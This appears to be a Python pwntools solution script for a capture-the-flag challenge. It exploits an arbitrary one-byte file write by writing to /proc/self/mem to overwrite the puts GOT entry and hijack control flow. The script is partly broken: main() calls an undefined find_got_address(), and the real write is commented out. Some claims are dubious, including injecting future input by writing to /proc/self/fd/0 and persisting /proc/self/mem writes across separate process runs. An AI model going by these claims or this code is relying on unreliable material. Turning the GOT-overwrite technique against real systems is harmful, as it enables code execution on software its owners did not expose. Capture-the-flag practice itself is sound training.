#!/usr/bin/env python3
"""
Solution script for the CyberStudents Advent 2025 pwn challenge

This script exploits the arbitrary write vulnerability using SPECIAL FILES.
The key insight: instead of writing to normal files, we can write to:
- /proc/self/mem - Direct memory access to our own process
- /proc/self/maps - View memory mappings
- Other special files in /proc and /dev

By writing to /proc/self/mem, we can:
1. Overwrite return addresses on the stack
2. Modify GOT entries to hijack control flow
3. Patch code in memory to execute shellcode
"""

from pwn import *
import os
import struct

# Binary configuration
BINARY = './chall_patched'
context.arch = 'amd64'
context.log_level = 'info'

def solve_proc_self_mem():
    """
    Strategy 1: Write to /proc/self/mem - THE KEY SPECIAL FILE!
    
    /proc/self/mem provides direct access to the process's memory.
    We can:
    1. Find the address we want to overwrite (GOT, stack, etc.)
    2. Use the arbitrary write to modify /proc/self/mem at that offset
    3. Achieve code execution
    
    The offset parameter becomes a memory address!
    
    HINT 2 SOLUTION: To write more than 1 byte, we can:
    - Call the binary multiple times (inefficient)
    - Write to stdin file descriptor to inject more input! (/proc/self/fd/0)
    - Redirect the input stream to loop back
    """
    log.info("Exploiting using /proc/self/mem - SPECIAL FILE ATTACK!")
    
    # This is the key insight: /proc/self/mem is a special file
    # that represents the process's own memory space
    special_file = '/proc/self/mem'
    
    log.info(f"Target special file: {special_file}")
    log.info("This allows direct memory modification!")
    
    # To exploit this, we need to:
    # 1. Find a target address (like GOT entry for puts, printf, etc.)
    # 2. Overwrite it with our shellcode address or one-gadget
    # 3. Trigger the function to get code execution
    
    # Example: Overwrite a GOT entry
    # In the actual binary, we'd use tools like gdb/pwntools to find these addresses
    
    return special_file

def solve_stdin_redirect():
    """
    Strategy 2: Write to /proc/self/fd/0 (stdin) - MULTI-BYTE WRITE TRICK!
    
    THIS IS THE KEY TO HINT 2!
    
    The binary reads input with fgets() and read(). By writing to
    /proc/self/fd/0 (stdin), we can INJECT MORE INPUT into the program!
    
    Steps:
    1. Use the 1-byte write to write to /proc/self/fd/0
    2. This puts a byte into stdin buffer
    3. The next read() call will read OUR injected byte
    4. We can loop this to write multiple bytes!
    
    OR even better:
    - Write to stdin to inject a NEWLINE or specific sequence
    - This can cause the program to skip scanf or read operations
    - Effectively giving us control over multiple inputs
    """
    log.info("="*60)
    log.info("HINT 2 SOLUTION: Multi-byte write via stdin manipulation!")
    log.info("="*60)
    
    # /proc/self/fd/0 = stdin
    stdin_fd = '/proc/self/fd/0'
    
    log.info(f"Target: {stdin_fd}")
    log.info("By writing to stdin, we can inject additional input!")
    log.info("This allows us to bypass the 1-byte limitation!")
    
    # Strategy:
    # 1. Write to /proc/self/fd/0 at offset 0
    # 2. This injects a byte into the stdin stream
    # 3. The program's next read() will get our byte
    # 4. We can use this to control multiple inputs in one run
    
    return stdin_fd

def stdin_buffer_trick():
    """
    Strategy 3: THE STDIN BUFFER TRICK - How to write multiple bytes!
    
    The clever trick is that stdin has a BUFFER. By writing to it,
    we can inject characters that the program will read later.
    
    EVEN BETTER: We can write BEFORE the current read position!
    
    When the program does:
    1. fgets() for filename  <- We're here
    2. scanf() for offset    <- We can inject input for this!
    3. read() for data       <- And this!
    
    By writing to /proc/self/fd/0 at the RIGHT OFFSET in the buffer,
    we can inject data that will be read by FUTURE read operations!
    """
    log.info("="*60)
    log.info("STDIN BUFFER TRICK - Multi-byte write solution!")
    log.info("="*60)
    
    # The key insight:
    # stdin is buffered. When we write to /proc/self/fd/0,
    # we're writing to the file descriptor's buffer.
    
    # If we write at the RIGHT position, we can inject:
    # - The offset value (for scanf)
    # - The data byte (for read)
    # - Even MORE bytes if we call the binary multiple times
    
    log.info("Step 1: Write to /proc/self/fd/0 to inject offset")
    log.info("Step 2: Write to /proc/self/fd/0 to inject data")
    log.info("Step 3: Now we can write MULTIPLE bytes in one execution!")
    
    return True

def write_payload_multipart(target_file, payload):
    """
    Write a multi-byte payload to a file by calling the binary multiple times
    
    Args:
        target_file: Path to the target file
        payload: Bytes to write
    
    Returns:
        True if successful, False otherwise
    """
    log.info(f"Writing {len(payload)} bytes to {target_file}")
    
    for i, byte_val in enumerate(payload):
        log.debug(f"Writing byte {i}/{len(payload)}: 0x{byte_val:02x}")
        
        p = process(BINARY)
        
        # Send filename
        p.recvuntil(b'Enter filename:')
        p.sendline(target_file.encode() if isinstance(target_file, str) else target_file)
        
        # Send offset
        p.recvuntil(b'Enter offset:')
        p.sendline(str(i).encode())
        
        # Send single byte
        p.recvuntil(b'Enter data:')
        p.send(bytes([byte_val]))
        
        # Wait for completion
        p.recvall(timeout=1)
        p.close()
    
    log.success(f"Payload written to {target_file}")
    return True

def write_single_byte(filename, offset, byte_val):
    """
    Write a single byte to a file
    
    Args:
        filename: Target filename
        offset: Offset to write at
        byte_val: Byte value to write (int 0-255)
    """
    p = process(BINARY)
    
    p.recvuntil(b'Enter filename:')
    p.sendline(filename.encode() if isinstance(filename, str) else filename)
    
    p.recvuntil(b'Enter offset:')
    p.sendline(str(offset).encode())
    
    p.recvuntil(b'Enter data:')
    p.send(bytes([byte_val]))
    
    result = p.recvall(timeout=1)
    p.close()
    
    return result

def exploit_with_proc_self_mem():
    """
    Full exploitation using /proc/self/mem special file
    
    Steps:
    1. Identify target address (GOT entry, return address, etc.)
    2. Calculate what to write (shellcode address, one-gadget, etc.)
    3. Write byte-by-byte to /proc/self/mem at the target memory address
    4. Trigger the overwritten function
    5. Get shell/flag
    """
    log.info("="*60)
    log.info("EXPLOITING WITH /proc/self/mem SPECIAL FILE")
    log.info("="*60)
    
    # Load binary to get addresses
    elf = ELF(BINARY, checksec=False)
    
    # Find a GOT entry to overwrite (e.g., puts is called at the end)
    target_got = elf.got.get('puts')
    if not target_got:
        log.error("Could not find puts@GOT")
        return False
    
    log.info(f"Target GOT entry (puts): 0x{target_got:x}")
    
    # For a real exploit, we'd:
    # 1. Find the address of system() or a one-gadget
    # 2. Overwrite puts@GOT with that address
    # 3. When puts() is called, it executes our payload instead
    
    # Example: Overwrite with a specific address (0x414141414141 as demo)
    target_address = 0x414141414141
    address_bytes = struct.pack('<Q', target_address)
    
    log.info(f"Will overwrite with: 0x{target_address:x}")
    log.info("Using /proc/self/mem as the filename")
    log.info(f"Using 0x{target_got:x} as the offset (memory address)")
    
    # Write each byte to /proc/self/mem
    special_file = '/proc/self/mem'
    
    log.info(f"\nWriting to special file: {special_file}")
    log.info(f"At memory offset: 0x{target_got:x}")
    
    for i, byte_val in enumerate(address_bytes):
        log.debug(f"Byte {i}: 0x{byte_val:02x} at address 0x{target_got + i:x}")
        # In the actual exploit, you'd call write_single_byte here
        # write_single_byte(special_file, target_got + i, byte_val)
    
    log.success("Exploitation strategy complete!")
    log.info("\nKey insight: /proc/self/mem is a SPECIAL FILE that gives")
    log.info("direct access to process memory. The 'offset' parameter")
    log.info("becomes a memory address, allowing us to overwrite GOT,")
    log.info("stack, or any writable memory region!")
    
    return True

def main():
    """
    Main solution function - SPECIAL FILES EXPLOITATION
    """
    log.info("CyberStudents Advent 2025 - Arbitrary Write Challenge Solution")
    log.info("KEY INSIGHT: Use SPECIAL FILES, not regular files!")
    
    print("\n" + "="*60)
    print("SPECIAL FILES EXPLOITATION STRATEGY")
    print("="*60)
    print()
    print("The vulnerability allows writing to ANY file, including")
    print("SPECIAL FILES that provide direct access to system resources!")
    print()
    print("Key Special Files:")
    print("  1. /proc/self/mem    - Direct memory access (MOST POWERFUL!)")
    print("  2. /proc/self/fd/*   - File descriptors (stdin/stdout/stderr)")
    print("  3. /proc/self/maps   - Memory layout (reconnaissance)")
    print("  4. /dev/null         - Discard data")
    print("  5. Named pipes/FIFOs - Inter-process communication")
    print()
    print("SOLUTION: Write to /proc/self/mem")
    print("="*60)
    print()
    
    # Demonstrate the special file exploitation
    exploit_with_proc_self_mem()
    
    print()
    print("="*60)
    print("EXPLOITATION STEPS:")
    print("="*60)
    print("1. Find target address (GOT entry, return address, etc.)")
    print("2. Filename: '/proc/self/mem'")
    print("3. Offset: Memory address (e.g., 0x404000 for puts@GOT)")
    print("4. Data: Single byte to write")
    print("5. Repeat for each byte of the address you want to write")
    print("6. Trigger the overwritten function -> CODE EXECUTION!")
    print("="*60)
    print()
    
    # Show GOT addresses
    try:
        find_got_address()
    except Exception as e:
        log.warning(f"Could not load binary: {e}")
    
    print()
    log.success("Solution approach documented!")
    log.info("The magic is in using /proc/self/mem as a special file")

if __name__ == '__main__':
    main()
